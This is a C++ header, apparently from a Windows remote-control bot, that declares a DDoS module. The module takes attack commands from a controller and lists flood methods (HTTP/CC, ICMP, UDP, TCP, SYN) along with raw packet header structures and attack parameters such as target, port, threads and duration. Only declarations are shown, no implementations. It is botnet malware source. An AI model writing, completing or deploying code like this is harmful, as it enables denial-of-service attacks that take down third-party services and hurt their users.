#pragma once
#include "Manager.h"
#include <stdlib.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <Wininet.h>
#pragma comment(lib,"Wininet.lib")

enum
{
	COMMAND_NEXT_DDOS,
	COMMAND_DDOS_ATTACK,
	COMMAND_DDOS_STOP,
};


enum
{
	ATTACK_CCFLOOD,     //变异CC
	ATTACK_IMITATEIE,   //模拟IE
	ATTACK_LOOPCC,      //轮回CC
	ATTACK_ICMPFLOOD,   //ICMP
	ATTACK_UDPFLOOD,    //UDP
	ATTACK_TCPFLOOD,    //TCP
	ATTACK_SYNFLOOD,	//SYN
	ATTACK_BRAINPOWER,  //智能.
	CUSTOM_TCPSEND = 100, //TCP 发包
	CUSTOM_UDPSEND,     //UDP 发包
};

typedef struct tcphdr			//tcp头
{
	USHORT th_sport;			//16位源端口
	USHORT th_dport;			//16位目的端口
	unsigned int th_seq;		//32位序列号
	unsigned int th_ack;		//32位确认号
	unsigned char th_lenres;	//4位首部长度+6位保留字中的4位
	unsigned char th_flag;		//2位保留字+6位标志位
	USHORT th_win;				//16位窗口大小
	USHORT th_sum;				//16位校验和
	USHORT th_urp;				//16位紧急数据偏移量
}TCP_HEADER;

typedef struct _iphdr				//ip头
{
	unsigned char h_verlen;			//4位首部长度+4位IP版本号 
	unsigned char tos;				//8位服务类型TOS 
	unsigned short total_len;		//16位总长度（字节） 
	unsigned short ident;			//16位标识 
	unsigned short frag_and_flags;	//3位标志位 
	unsigned char ttl;				//8位生存时间TTL 
	unsigned char proto;			//8位协议号(TCP, UDP 或其他) 
	unsigned short	checksum;		//16位IP首部校验和 
	unsigned int sourceIP;			//32位源IP地址 
	unsigned int destIP;			//32位目的IP地址 
}IP_HEADER;

typedef struct tsd_hdr
{
	unsigned long  saddr;
	unsigned long  daddr;
	char           mbz;
	char           ptcl;
	unsigned short tcpl;
}PSD_HEADER;

typedef struct _icmphdr				//定义ICMP首部
{
	BYTE   i_type;					//8位类型
	BYTE   i_code;					//8位代码
	USHORT i_cksum;					//16位校验和 
	USHORT i_id;					//识别号（一般用进程号作为识别号）
	USHORT i_seq;					//报文序列号	
	ULONG  timestamp;				//时间戳
}ICMP_HEADER;


typedef struct DDOS_HEAD
{
	TCHAR Target[400];    //攻击目标
	WORD AttackPort;     //攻击端口
	WORD AttackType;     //攻击类型
	WORD AttackThread;   //攻击线程
	WORD AttackTime;     //攻击时间
	CHAR SendData[2000]; //发送的数据包
	WORD DataSize;       //数据包大小
	DWORD ExtendData1;   //附加数据
	DWORD ExtendData2;   //附加数据
}ATTACK, * LPATTACK;



#define ICMP_ECHO         8
#define MAX_PACKET       4096


class DDOSManager : public CManager
{
public:
	BOOL m_buser;
	DDOSManager(ISocketBase* pClient);
	virtual ~DDOSManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	void DDOSAttackr(LPATTACK PoinParam);
	DWORD ResolvDNS(LPWSTR szTarget);
	DWORD CreateRandNum(WORD Min = 0, WORD Max = 0);
	BOOL GetSystemType();
	static DWORD WINAPI CCAttack(LPVOID lParam);
	static DWORD WINAPI ImitateIERequst(LPVOID lParam);
	static DWORD WINAPI LoopCCAttack(LPVOID lParam);
	static DWORD WINAPI CreateTimeer(LPVOID lParam);
	 void Fill_ICMP_Data(char* icmp_data, int datasize);
	static DWORD WINAPI ICMP_Flood(LPVOID lParam);
	static DWORD WINAPI UDPAttackModel(LPVOID lParam);
	static DWORD WINAPI SYNFlood(LPVOID lParam);
protected:
	 DWORD CountTime;
private:
	ATTACK m_Attack;



};
